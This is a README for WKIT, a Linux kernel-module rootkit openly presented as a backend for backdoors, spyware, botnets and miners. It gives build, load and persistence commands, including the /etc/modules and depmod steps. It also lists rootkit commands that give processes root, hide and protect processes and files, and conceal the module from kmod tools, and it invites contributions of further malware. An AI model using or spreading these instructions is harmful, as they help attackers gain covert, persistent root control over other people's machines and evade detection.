# WKIT | A LKM rootkit for modern kernels 
WKIT is a linux loadable kernel module rootkit. It provides
different interfaces for userland malware such as backdoors,
spywares, botnets and miners.

### Todo
- [x] Move config to header files 
- [ ] Path resolution for hidden files
- [ ] Add more userland malware 
- [ ] Add automated install scripts

### Supported Systems
- Kernel version: `>=5.7` (5.7 and above)
- Tested on: `Ubuntu 22.04 (5.15.0)` and `Arch Linux (6.6.7)`

### Installation
You will need to install `linux-headers` (kernel headers) as 
well as `build-essentials` (gcc, make etc.) before the installation. 

To build the module, first clone the repository:
```bash
git clone https://github.com/ngn13/wkit.git
cd wkit/module
```

---

#### Configuration
Configuration options can be found in `lib/options.h`, the default
options are:
```c
#define USUM "c26cb4a24cb2faaab442669624b8cdca1e5a769ac3b60674c332422fedca0b3f"
#define SIGNAL 1337
#define DEBUG false
```
- `USUM`: Unique 64 character long sum, you can create one by running:
- `SIGNAL`: Kill signal used for registering clients
- `DEBUG`: Default debug option, this can be later changed by sending commands

To create a completely randomized configuration, run the `mkconfig.sh` script:
```bash
source ../scripts/mkconfig.sh > lib/options.h
```

---

After editing the configuration header, run the make script to build the module:
```bash
make 
```
To load the module you can use the insmod command: 
```bash
insmod wkit.ko
```
To make it persistence, you can add an entry to the `/etc/modules`:
```bash
echo "wkit #$USUM" > /etc/modules
cp wkit.ko /lib/modules/$( uname -r)/kernel
depmod
```

### Working with WKIT
#### Registering a client
WKIT will receive commands from a client. A client is just process running on the system, 
you can register a client by sending the it the $SIGNAL you specified in the config options.

The regular kill command may not allow you to do so, however you can send any signal 
using the `kill(2)` syscall. If you just want to play around, you compile and use the utils 
in the `utils` directory. The `signal` program lets you send whatever signal you want.

Clients can send commands to WKIT, can see hidden files, processes and file contents.
They can also kill hidden processes.

#### Sending commands
After registering your userland malware as a client, you can send commands to the rootkit 
using the `/proc/wkit_dev[USUM]` device. If you want to play around, you can use
the `cmd` program in the `utils` directory, which registers itself as a client and sends 
the commands you specify.

Here is a list of all the commands:
- `root <anything>`: Sending this command (`<anything>` means you can place any parameter) will
give the current process root access
- `proc <pid>`: This command will make the process specified with `<pid>` invisible and unkillable
- `file <path>`: This command will make the file specified with `<path>` invisible and unremovable,
you should specify full and releative paths, for example if you want to hide `/tmp/hello/world` you should
send these commands:
```
file /tmp/hello/world
file hello/world
file world
```
Files that contain the `usum` in their name are also hidden
- `debug <anything>`: This command toggles the debug mode, which will enable/disable `dmesg` output,
and also will hide/unhide for the `kmod` tools.

### Userland 
You can check out the `user` foler if you want to see how userland malware interacts with 
the rootkit, I will be adding more userland stuff in the future. If you have any cool userland
malware ideas that can work with WKIT, then you can create an issue/PR.
